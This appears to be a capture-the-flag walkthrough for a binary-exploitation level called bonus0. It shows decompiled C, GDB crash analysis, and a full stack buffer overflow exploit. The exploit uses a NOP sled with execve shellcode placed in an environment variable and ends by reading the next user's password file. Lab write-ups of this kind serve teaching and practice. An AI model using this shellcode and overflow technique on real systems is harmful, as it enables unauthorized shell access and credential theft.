# Walkthrough

The home of bonus0 contains a binary, `bonus0`. We decompile it using dogbolt, there are a few interesting functions:

```c
char *__cdecl pp(char *main_string)
{
  char a[20]; 
  char b[20];

  p(a, " - ");
  p(b, " - ");
  strcpy(main_string, a);
  main_string[strlen(main_string)] = ' ';
  main_string[strlen(main_string)] = '\0';
  return strcat(main_string, b);
}
```
`strcat` is a dangerous function. Entry of its `man`:
```
SECURITY CONSIDERATIONS
     The strcat() function is easily misused in a manner which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack.  (See the FSA.)

     Avoid using strcat().  Instead, use strncat() or strlcat() and ensure that no more characters are copied to the destination buffer than it can hold.

     Note that strncat() can also be problematic.  It may be a security concern for a string to be truncated at all.  Since the truncated string will not be as long as the original, it may refer to a completely
     different resource and usage of the truncated resource could result in very incorrect behavior. 
```


```c
char *__cdecl p(char *dest, char *puts_string)
{
  char buf[4096];

  puts(puts_string);
  read(0, buf, 4096);
  *strchr(buf, '\n') = 0; // Replaces the \n by a \0
  return strncpy(dest, buf, 20);
}
```
From the `man` of `strncpy`:
```
     The following sets chararray to “abcdef”:

           char chararray[6];

           (void)strncpy(chararray, "abcdefgh", sizeof(chararray));

     Note that it does not NUL terminate chararray because the length of the source string is greater than or equal to the length argument.
```

But `strcpy` needs a `\0` to see when to stop copying, making the `pp` function vulnerable.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char main_string[42]; 

  pp(main_string);
  puts(main_string);
  return 0;
}
```

Using GDB, we get interesting information:
```
Starting program: /home/user/bonus0/bonus0
 -
AAAABBBBCCCCDDDDEEEE
 -
AAAABBBBCCCCDDDDEEEE
AAAABBBBCCCCDDDDEEEEAAAABBBBCCCCDDDDEEEE�� AAAABBBBCCCCDDDDEEEE��

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff710	0xbffff710
ebp            0x43424242	0x43424242
esi            0x0	0
edi            0x0	0
eip            0x44434343	0x44434343
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
We see that `ebp` and `eip` contain interesting values.
- `ebp`: `0x43424242` = "CBBB"
- `eip`: `0x44434343` = "DCCC"
The interesting part is that we managed to change the process execution flow by changing the value of `eip`. 

Now, let's try to find which string set the value of eip:
```
Starting program: /home/user/bonus0/bonus0
 -
AAAABBBBCCCCDDDDEEEE
 -
AAAABBBBCZZZZCCCDDDD
AAAABBBBCCCCDDDDEEEEAAAABBBBCZZZZCCCDDDD�� AAAABBBBCZZZZCCCDDDD��

Program received signal SIGSEGV, Segmentation fault.
0x5a5a5a5a in ?? ()
(gdb) i r
eax            0x0	0
ecx            0xffffffff	-1
edx            0xb7fd28b8	-1208145736
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff710	0xbffff710
ebp            0x43424242	0x43424242
esi            0x0	0
edi            0x0	0
eip            0x5a5a5a5a	0x5a5a5a5a
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```
As you can see here, `eip` is now at `0x5a5a5a5a` = "ZZZZ"
Thus, we now that we need to input 9 characters in the second string to change `eip`. 

We want to pass our shellcode inside of an environment variable, as the buffer might be too small and we want to make a nopsled for easier access.

```
bonus0@RainFall:~$ env -i payload=$(python -c 'print "\x90"*500+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') gdb -q bonus0
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/500s environ
...TRIM...
0xbffffe6e:	 "\220\220\220\220\220\220\220\220\22
...TRIM...
```
We choose address `0xbffffe6e` in the nopsled (reminder: a 'nopsled' is a chain of No Operator, thus we slide to the next real operator encountered).

Let's craft the final payload, first the input to give to the program:
```
python -c 'print "A"*4095+"\n" + "A"*9+"\x6e\xfe\xff\xbf"+"A"*7' > input.txt
```
We use 4095 + 1 characters for the first `read` call, to fill the buffer.
We put a '\n' to end the first string, 
The second string starts with 9 charcters of padding, then the address of our env variable, and extra characters to fill the string.

Then start the program with the payload in the env:
```
bonus0@RainFall:~$ cat input.txt - | env -i payload=$(python -c 'print "\x90"*500+"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"') bonus0
 -
 -
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAn���AAAAAAA�� AAAAAAAAAn���AAAAAAA��
whoami
bonus1
cat /home/user/bonus1/.pass
```